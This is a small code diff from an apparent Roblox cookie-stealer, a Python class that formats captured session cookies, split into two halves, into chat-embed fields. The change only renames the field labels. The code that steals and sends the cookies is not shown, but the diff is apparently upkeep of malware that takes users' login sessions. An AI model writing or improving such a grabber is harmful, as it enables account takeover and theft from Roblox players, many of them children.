@@ -70,12 +70,12 @@ class Roblox:
                                     "inline": True
                                 },
                                 {
-                                    "name": "🍪 **Cookie Part 1**",
+                                    "name": "🍪 **Cookie**",
                                     "value": f"`{first_cookie_half}`",
                                     "inline": False
                                 },
                                 {   
-                                    "name": "🍪 **Cookie Part 2**",
+                                    "name": "",
                                     "value": f"`{second_cookie_half}`",
                                     "inline": False
                                 }
